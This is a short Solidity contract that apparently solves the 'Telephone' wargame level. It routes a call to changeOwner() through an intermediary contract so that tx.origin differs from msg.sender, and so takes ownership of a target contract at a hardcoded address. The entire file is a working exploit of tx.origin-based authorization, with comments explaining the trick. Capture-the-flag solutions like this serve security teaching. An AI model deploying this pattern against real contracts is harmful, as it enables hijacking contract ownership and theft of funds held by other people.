// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// We'll create a contract that calls the changeOwner() method in Telephone
// This way, we can have tx.origin be our wallet address, and msg.sender be
//  the address of this contract, thereby allowing us to get ownership of
//  the Telephone instance

contract CallTelephone {
    address myAddress = address(0xcDA1048cf97B65ED9fb852AE677F02a28bd09ad3);
    address telephoneAddress =
        address(0xD0e3A96F0db599431Acee4455aee61de3715E5Eb);

    function hackTelephone() public returns (bytes memory) {
        bytes memory payload = abi.encodeWithSignature(
            "changeOwner(address)",
            myAddress
        );
        (bool success, bytes memory returnedData) = telephoneAddress.call{
            value: 0
        }(payload);

        require(
            success,
            "hackTelephone() did not successfully call changeOwner()"
        );

        return returnedData;
    }
}
